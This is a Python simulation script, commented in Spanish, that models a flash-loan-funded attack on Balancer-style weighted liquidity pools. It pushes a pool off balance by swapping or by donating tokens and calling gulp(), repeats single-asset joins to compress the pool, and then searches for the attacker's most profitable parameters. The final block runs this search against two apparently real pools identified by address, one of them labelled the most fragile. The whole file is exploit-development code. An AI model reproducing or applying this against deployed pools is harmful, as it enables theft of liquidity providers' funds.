"""
¿Se puede ABRIR un pool que hoy está por encima del umbral?

Tres maniobras previas al bucle de compresión, todas financiables con un flash
loan (el capital se recupera en la misma transacción):

  (a) swap    : vender B contra el pool para sacar A y dejar A famélico.
                -> te cuesta el fee + la curvatura; te llevas A a precio AMM.
  (b) donate  : transferir B al pool (invisible para el AMM) y llamar gulp()
                -> te cuesta el 100% del donativo; recuperas f de él al salir.
  (c) ninguno : control.

Contabilidad en unidades homogéneas (1 unidad = 1 unidad de valor): el neto es
exactamente  salida + A sobrante - B gastado.  Enteros en todo lo que toca el
contrato; los valores se convierten al final.

Uso:  python3 open_balanced.py [rho_inicial]
"""
import sys
from bmath_sim import (Pool, Revert, bmul, btoi, BONE, MAX_IN_RATIO,
                       calcSingleOutGivenPoolIn)

A, B = "A", "B"


def mkpool(rho_a, w_a, fee, tvl=200_000):
    """pool de 2 tokens con rho_a dado (rho=1 => equilibrado)"""
    w_b = 1.0 - w_a
    # rho_a = vA/(wA*TVL)  con vB = TVL - vA
    vA = rho_a * w_a * tvl
    vB = tvl - vA
    return Pool([{"sym": A, "dec": 18, "bal": int(vA * 1e18), "denorm": int(w_a * BONE)},
                 {"sym": B, "dec": 18, "bal": int(vB * 1e18), "denorm": int(w_b * BONE)}],
                fee=fee), vA, vB


def run(mode, push_frac, n, rho_a=1.0, w_a=0.5, fee=int(0.003 * BONE), tvl=200_000):
    pool, _, _ = mkpool(rho_a, w_a, fee, tvl)
    pS0 = pool.pS
    tw = pool.tW
    spent = 0.0          # valor puesto por el atacante (en unidades de valor)
    held = 0             # unidades de A fuera del pool
    deposited = 0        # A que se mete en el pool (raw)
    if mode == "swap":
        b_in = int(push_frac * pool.t[B]["bal"])
        if b_in < 1:
            return None
        try:
            a_out = pool.swapExactAmountIn(B, b_in, A, 0, 10**27)
        except Revert:
            return None
        spent += b_in / 1e18
        held += a_out
    elif mode == "donate":
        don = int(push_frac * pool.t[B]["bal"])
        if don < 1:
            return None
        pool.gulp(B, pool.t[B]["bal"] + don)     # transferencia directa + gulp()
        spent += don / 1e18
        held = 10**40                            # el A se compra a mercado (1:1)
    # --- bucle de compresión con A
    for _ in range(n):
        cap = bmul(pool.t[A]["bal"], MAX_IN_RATIO)
        if cap > held:
            cap = held
        if cap < 1:
            break
        pool.joinswapExternAmountIn(A, cap, 0)
        held -= cap
        deposited += cap
    mine = pool.pS - pS0
    if mine <= 0:
        return None
    # --- salida: la mejor de pro-rata / mono-token
    pro = sum(pool.t[s]["bal"] * mine // pool.pS for s in pool.order) / 1e18
    one, which = 0.0, None
    try:
        for s in pool.order:
            o = calcSingleOutGivenPoolIn(pool.t[s]["bal"], pool.t[s]["denorm"],
                                         pool.pS, tw, mine, fee)
            if o / 1e18 > one:
                one, which = o / 1e18, s
    except Revert:
        pass
    out = max(pro, one)
    bought = deposited / 1e18 if mode == "donate" else 0.0
    leftover = held / 1e18 if mode == "swap" else 0.0
    net = out + leftover - spent - bought
    return dict(mode=mode, push=push_frac, n=n, spent=spent + bought, out=out,
                held=leftover, net=net, frac=mine / pool.pS,
                exit=("pro-rata" if pro >= one else f"mono:{which}"))


def sweep(rho_a, w_a, label):
    print(f"\n=== {label}  (rho_A={rho_a:.3f}, w_A={w_a*100:.0f}%) ===")
    print(f"{'modo':<8}{'empuje':>8}{'n':>4}{'gastado':>12}{'salida':>12}"
          f"{'f':>7}{'mejor neto':>13}  salida")
    best = None
    for mode in ("swap", "donate"):
        for push in (0.02, 0.05, 0.1, 0.2, 0.35, 0.5, 0.8, 0.95):
            for n in (1, 2, 3, 5, 8, 13, 20, 30, 45, 60):
                r = run(mode, push, n, rho_a, w_a)
                if r and (best is None or r["net"] > best["net"]):
                    best = r
    if best:
        print(f"{best['mode']:<8}{best['push']:>8.2f}{best['n']:>4}"
              f"{best['spent']:>12,.0f}{best['out']:>12,.0f}"
              f"{best['frac']*100:>6.1f}%{best['net']:>13,.0f}  {best['exit']}")
    # detalle de los push razonables
    for mode in ("swap", "donate"):
        for push in (0.02, 0.1, 0.35):
            bb = None
            for n in (1, 2, 3, 5, 8, 13, 20, 30, 45):
                r = run(mode, push, n, rho_a, w_a)
                if r and (bb is None or r["net"] > bb["net"]):
                    bb = r
            if bb:
                print(f"{mode:<8}{push:>8.2f}{bb['n']:>4}{bb['spent']:>12,.0f}"
                      f"{bb['out']:>12,.0f}{bb['frac']*100:>6.1f}%{bb['net']:>13,.0f}"
                      f"  {bb['exit']}")
    return best


if __name__ == "__main__":
    rho = float(sys.argv[1]) if len(sys.argv) > 1 else 1.0
    for w in (0.5, 0.2, 0.8):
        sweep(rho, w, "EQUILIBRADO" if rho == 1.0 else "casi umbral")
    # el caso real más cercano: 0x74a5d106, rho=0.9421, w=0.30
    sweep(0.9421, 0.30, "0x74a5d106 (el 'seguro' más frágil, rho*=0.862)")
    sweep(0.9983, 0.50, "0x5a0d8516 (rho=0.9983, rho*=0.899)")
